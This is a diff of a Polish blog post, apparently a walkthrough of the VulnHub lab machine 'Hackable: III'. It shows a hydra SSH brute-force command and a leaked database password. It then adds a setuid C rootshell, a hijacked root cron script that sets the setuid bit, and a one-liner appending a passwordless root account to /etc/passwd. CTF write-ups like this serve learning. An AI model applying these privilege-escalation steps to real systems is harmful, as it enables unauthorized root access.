@@ -1,5 +1,5 @@
 ---
-title: "Hackable: III - in progress"
+title: "Hackable: III"
 excerpt: " "
 comments: true
 categories:
@@ -173,9 +173,140 @@ hydra -V -T 64 ssh://172.16.1.103 -l jubiscleudo -P wordlist.txt
 Jak widzimy mamy użytkownika **jubiscleudo** i hasło **onlymy**. Wejdźmy na shella.
 {: .text-justify}
 ## Shelltris
-W katalogu **scripts** jest plik **tetris.sh**. Po uruchomieniu brakuje w nim pliku getch i program blokuje cały system. Popatrzyłem na kod źródłowy i zobaczyłem, że oryginalny nazywa się **ShellTris**. Ściągnałem cały [kod](https://shellscriptgames.com/shelltris/tarballs/shelltris-1.1.tar.gz). Skompilowałem na swoim shellu plik **getch.c**. I nic. Nie ma root-a. Pliki mają identyczną zawartość, ale być coś może nasłuchuje i sprawdza? (Elias Souls mi wspomniał, że Shelltris to pułapka. 😏) Być może za jakiś czas rozwiążę problem, jak nie, to pewnie zrobi to ktoś inny. Jeżeli znalazłeś rozwiązanie to napisz [kerszi@protonmail.com](mailto:kerszi@protonmail.com). 
+W katalogu **scripts** jest plik **tetris.sh**. Po uruchomieniu brakuje w nim pliku getch i program blokuje cały system. Popatrzyłem na kod źródłowy i zobaczyłem, że oryginalny nazywa się **ShellTris**. Ściągnałem cały [kod](https://shellscriptgames.com/shelltris/tarballs/shelltris-1.1.tar.gz). Skompilowałem na swoim shellu plik **getch.c**. I nic. Nie ma root-a. Pliki mają identyczną zawartość, ale być coś może nasłuchuje i sprawdza? (Elias Souls mi wspomniał, że Shelltris to pułapka) 😏
 {: .text-justify}
 {% include gallery id="gallery4_5"  %}
+## Zostawcie Shelltris w spokoju 
+Shelltris to pułapka, zostawcie to. Wcześniej pominąłem jedną ważną rzecz, a to mnie zablokowało na dłużej. Co prawda podpatrzyłem w [solucji](https://nepcodex.com/2021/07/hackable-iii-walkthrough-vulnhub/) tylko tą jedną rzecz, bo i tak rozwiązanie jest inne i **Eliasa Soulsa** też coś pokazał, ale zrobiłem to po swojemu. Jeszcze raz przeszedłem do katalogu **/var/www/html**
+{: .text-justify}
+```console
+jubiscleudo@ubuntu20:/var/www/html$ ls -la
+total 128
+drwxr-xr-x 8 root     root      4096 Jul 30 18:30 .
+drwxr-xr-x 3 root     root      4096 Apr 29 16:13 ..
+-rw-r--r-- 1 www-data www-data 61259 Apr 21 14:23 3.jpg
+drwxr-xr-x 2 www-data www-data  4096 Apr 23 16:05 backup
+-r-xr-xr-x 1 www-data www-data   522 Apr 29 15:41 .backup_config.php
+drwxr-xr-x 2 www-data www-data  4096 Apr 29 15:41 config
+-rw-r--r-- 1 www-data www-data   507 Apr 23 14:52 config.php
+drwxr-xr-x 2 www-data www-data  4096 Apr 21 18:16 css
+-rw-r--r-- 1 www-data www-data 11327 Jun 30 20:37 home.html
+drwxr-xr-x 2 www-data www-data  4096 Apr 21 18:10 imagens
+-rw-r--r-- 1 www-data www-data  1095 Jun 30 20:43 index.html
+drwxr-xr-x 2 www-data www-data  4096 Apr 20 14:54 js
+drwxr-xr-x 5 www-data www-data  4096 Jun 30 20:37 login_page
+-rw-r--r-- 1 www-data www-data   487 Apr 23 14:33 login.php
+-rw-r--r-- 1 www-data www-data    33 Apr 21 17:58 robots.txt
+-rw-r--r-- 1 root     root        24 Jul 30 18:30 test.php
+```
+Pominąłem **.backup_config.php**, a w nim jest login i hasło dla użytkownika **hackable_3**
+{: .text-justify}
+```php
+<?php
+/* Database credentials. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'hackable_3');
+define('DB_PASSWORD', 'TrOLLED_3');
+define('DB_NAME', 'hackable');
+
+/* Attempt to connect to MySQL database */
+$conexao = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
+
+
+// Check connection
+if($conexao === false){
+    die("ERROR: Could not connect. " . mysqli_connect_error());
+} else {
+}
+?>
+```
+## Grupa adm
+Logując się na Shella użytkownika **hackable_3** i wypisując komendę **id** zauważyłem takie coś:
+{: .text-justify}
+```console
+hackable_3@ubuntu20:/var/www/html$ id
+uid=1000(hackable_3) gid=1000(hackable_3) groups=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+hackable_3@ubuntu20:/var/www/html$
+```
+**hackable_3** jest w grupie **adm**. Poszukajmy, to może coś znajdziemy ciekawego:
+{: .text-justify}
+```console
+hackable_3@ubuntu20:/var/www/html$ grep adm /etc/group
+adm:x:4:syslog,hackable_3
+hackable_3@ubuntu20:/var/www/html$
+```
+```console
+hackable_3@ubuntu20:/var/www/html$ find / -group adm 2>/dev/null
+/var/log/cloud-init-output.log
+/var/log/dmesg.3.gz
+/var/log/auth.log.1
+/var/log/syslog.1
+/var/log/auth.log.4.gz
+/var/log/auth.log.3.gz
+/var/log/syslog
+/var/log/dmesg.0
+/var/log/auth.log.2.gz
+```
+```console
+hackable_3@ubuntu20:/var/log$ cat syslog
+Aug 10 22:24:01 ubuntu20 CRON[5133]: (root) CMD (python3 /scripts/to_hackable_3.py)
+Aug 10 22:26:01 ubuntu20 CRON[5141]: (root) CMD (python3 /scripts/to_hackable_3.py)
+Aug 10 22:28:01 ubuntu20 CRON[5149]: (root) CMD (python3 /scripts/to_hackable_3.py)
+Aug 10 22:30:01 ubuntu20 CRON[5156]: (root) CMD (python3 /scripts/to_hackable_3.py)
+Aug 10 22:32:01 ubuntu20 CRON[5162]: (root) CMD (python3 /scripts/to_hackable_3.py)
+Aug 10 22:34:01 ubuntu20 CRON[5170]: (root) CMD (python3 /scripts/to_hackable_3.py)
+Aug 10 22:36:01 ubuntu20 CRON[5187]: (root) CMD (python3 /scripts/to_hackable_3.py)
+Aug 10 22:38:01 ubuntu20 CRON[5193]: (root) CMD (python3 /scripts/to_hackable_3.py)
+Aug 10 22:40:01 ubuntu20 CRON[5201]: (root) CMD (python3 /scripts/to_hackable_3.py)
+```
+## Włany Rootshell
+Crontab nie może uruchomić z **Root-a** programu **/scripts/to_hackable_3.py**. Akcja działa co 2 minuty. Pomóżmy mu, aby się Crontab nie męczył :smiley:, ale zanim to nastąpi skompilujmy u siebie na konsoli (niestety nie mamy tutaj **gcc**) prosty rootshell i wrzućmy go na konto. A czemu tak się bawić? Zwykłe skrypty z ustawionym bitem Suid nie przechodzą na Root-a z innego użytkownika, więc najlepiej napisać program i go skompilować:
+```c
+void main()
+{ setuid(0);
+  setgid(0);
+  system("/bin/bash");
+}
+```
+Rootshell wrzucamy do katalogu:
+```bash
+cp /home/hackable_3/rootshell /scripts/
+```
+A zawartość **/scripts/to_hackable_3.py** może wyglądać tak:
+{: .text-justify}
+```python
+from os import system
+system('chown root:root /scripts/rootshell && chmod u+s /scripts/rootshell')
+```
+Czekamy z 2 minuty, aby Crontab odwalił za nas robotę:
+{: .text-justify}
+```console
+hackable_3@ubuntu20:/scripts$ ls -la
+total 100
+drwxr-xr-x  2 hackable_3 hackable_3  4096 Aug 10 23:06 .
+drwxr-xr-x 21 root       root        4096 Apr 29 16:32 ..
+-rw-r--r--  1 root       root         105 Jun 30 20:45 README.txt
+-rwsr-xr-x  1 root       root       16712 Aug 10 21:39 rootshell
+-rw-r--r--  1 hackable_3 hackable_3  1300 Aug 10 16:30 shadow
+-rwxr-xr-x  1 root       root       59653 Apr 28 15:06 tetris.sh
+-rwxrwxr-x  1 hackable_3 hackable_3   251 Aug 10 21:59 to_hackable_3.py
+```
+**Rootshell** ma Suida i Root-a:
+```console
+hackable_3@ubuntu20:/scripts$ ./rootshell
+root@ubuntu20:/scripts# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd),1000(hackable_3)
+root@ubuntu20:/scripts#
+```
+Zamiast tworzyć rootshell, to możemy dodać użytkownika do pliku **/etc/passwd**:
+{: .text-justify}
+```bash
+echo 'kerszi::0:0:,,,:/root:/bin/bash' >> /etc/passwd
+```
+## Parę słów na koniec
 Uwaga, jeżeli chcesz, żeby ta maszyna działała na XCP-ng trzeba podczas startu systemu zmienic w Grubie ro na rw init=/bin/bash, potem F10, w /etc/netplan/00-installer-config.yaml zmieniamy na interfejs eth0. Dodatkowo należy zmienić w /etc/default/knockd na KNOCKD_OPTS="-i eth0".
 {: .text-justify}
 {: .notice--danger}
+Jeżeli się podobała solucja, to napisz na [kerszi@protonmail.com](mailto:kerszi@protonmail.com).
+{: .text-justify}
